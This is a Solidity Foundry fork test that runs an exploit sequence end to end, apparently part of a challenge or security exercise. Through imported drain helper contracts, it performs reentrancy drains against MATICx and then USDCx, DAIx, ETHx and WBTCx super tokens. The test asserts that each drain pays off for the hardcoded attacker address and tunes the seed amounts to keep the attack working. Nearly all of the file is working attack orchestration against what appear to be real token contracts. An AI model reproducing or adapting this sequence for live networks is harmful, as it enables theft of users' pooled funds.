// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {
    Ch5Drain,
    Ch5ERC20Drain,
    ISuperToken,
    IERC20Minimal
} from "../exploit/Run.s.sol";

/// @notice End-to-end fork smoke test for the current `exploit/Run.s.sol`
///         helper sequence on a fresh reset snapshot.
contract Attempt48EndToEndRunSmokeTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant ETHX = 0x27e1e4E6BC79D93032abef01025811B7E4727e85;
    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;

    uint256 internal constant NATIVE_REENTRY_COUNT = 10;
    uint256 internal constant NATIVE_PHASE1_ROUNDS = 4;
    uint256 internal constant NATIVE_GAS_RESERVE = 0.02 ether;
    uint256 internal constant NATIVE_BACKING_MARGIN = 1 gwei;

    uint256 internal constant MAX_REENTRY_COUNT = 10;
    uint256 internal constant MAX_ROUNDS_PER_HELPER = 3;
    uint256 internal constant MAX_HELPERS_PER_TOKEN = 4;
    uint256 internal constant GAS_RESERVE = 5 ether;

    uint256 internal constant USDC_BOOTSTRAP_NATIVE = 250 ether;
    uint256 internal constant DAI_BOOTSTRAP_NATIVE = 250 ether;
    uint256 internal constant ETH_BOOTSTRAP_NATIVE = 250 ether;
    uint256 internal constant WBTC_BOOTSTRAP_NATIVE = 250 ether;

    uint32 internal constant USDC_INDEX_BASE = 520_000_000;
    uint32 internal constant DAI_INDEX_BASE = 530_000_000;
    uint32 internal constant ETH_INDEX_BASE = 535_000_000;
    uint32 internal constant WBTC_INDEX_BASE = 540_000_000;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_run_sequence_increases_native_balance() public {
        uint256 nativeBefore = ATTACKER.balance;
        uint256 nativeSeed = _computeNativeSeed(nativeBefore, MATICX.balance);

        vm.startPrank(ATTACKER);

        if (nativeSeed > 0) {
            Ch5Drain nativeDrain = new Ch5Drain();
            nativeDrain.executeRound{value: nativeSeed}(NATIVE_REENTRY_COUNT);

            for (uint256 i = 1; i < NATIVE_PHASE1_ROUNDS; ++i) {
                uint256 nextSeed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
                if (nextSeed == 0) {
                    break;
                }

                nativeDrain.executeRound{value: nextSeed}(NATIVE_REENTRY_COUNT);
            }

            uint256 nativePhase2Seed = _computeNativeSeed(ATTACKER.balance, MATICX.balance);
            if (nativePhase2Seed > 0) {
                Ch5Drain nativePhase2Drain = new Ch5Drain();
                nativePhase2Drain.executeRound{value: nativePhase2Seed}(NATIVE_REENTRY_COUNT);
            }
        }

        uint256 nativeAfterMaticx = ATTACKER.balance;
        uint256 requiredBootstrap =
            USDC_BOOTSTRAP_NATIVE + DAI_BOOTSTRAP_NATIVE + ETH_BOOTSTRAP_NATIVE + WBTC_BOOTSTRAP_NATIVE + GAS_RESERVE;
        assertGt(nativeAfterMaticx, requiredBootstrap, "insufficient native after MATICx");

        _drainToken(USDCX, USDC_INDEX_BASE, USDC_BOOTSTRAP_NATIVE);
        _drainToken(DAIX, DAI_INDEX_BASE, DAI_BOOTSTRAP_NATIVE);
        _drainToken(ETHX, ETH_INDEX_BASE, ETH_BOOTSTRAP_NATIVE);
        _drainToken(WBTCX, WBTC_INDEX_BASE, WBTC_BOOTSTRAP_NATIVE);

        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "native balance should strictly increase");
    }

    function _computeNativeSeed(uint256 attackerNative, uint256 maticxBackingBefore) internal pure returns (uint256) {
        if (attackerNative <= NATIVE_GAS_RESERVE) {
            return 0;
        }

        uint256 spendable = attackerNative - NATIVE_GAS_RESERVE;
        uint256 safeByBacking = maticxBackingBefore / NATIVE_REENTRY_COUNT;
        if (safeByBacking <= NATIVE_BACKING_MARGIN) {
            return 0;
        }

        unchecked {
            safeByBacking -= NATIVE_BACKING_MARGIN;
        }

        return spendable < safeByBacking ? spendable : safeByBacking;
    }

    function _drainToken(address superToken, uint32 indexBase, uint256 bootstrapNative) internal {
        address underlying = ISuperToken(superToken).getUnderlyingToken();
        uint256 initialBacking = IERC20Minimal(underlying).balanceOf(superToken);
        if (initialBacking <= 1) {
            return;
        }

        uint256 helperIndex;
        uint256 totalRounds;
        uint256 backingBefore = initialBacking;

        while (helperIndex < MAX_HELPERS_PER_TOKEN && backingBefore > 1) {
            uint256 nativeBeforeHelper = ATTACKER.balance;
            Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
            (uint256 roundsExecuted,) =
                drain.executeDrain{value: bootstrapNative}(MAX_ROUNDS_PER_HELPER, MAX_REENTRY_COUNT);

            uint256 nativeAfterHelper = ATTACKER.balance;
            uint256 backingAfter = IERC20Minimal(underlying).balanceOf(superToken);

            assertGt(roundsExecuted, 0, "no rounds executed");
            assertGt(nativeAfterHelper, nativeBeforeHelper, "helper not profitable");
            assertLt(backingAfter, backingBefore, "backing unchanged");

            totalRounds += roundsExecuted;
            backingBefore = backingAfter;

            unchecked {
                ++helperIndex;
            }
        }

        assertGt(totalRounds, 0, "token had no profitable rounds");
        assertLt(backingBefore, initialBacking, "token backing unchanged");
        assertGt(ATTACKER.balance, GAS_RESERVE, "attacker balance unexpectedly depleted");
    }
}
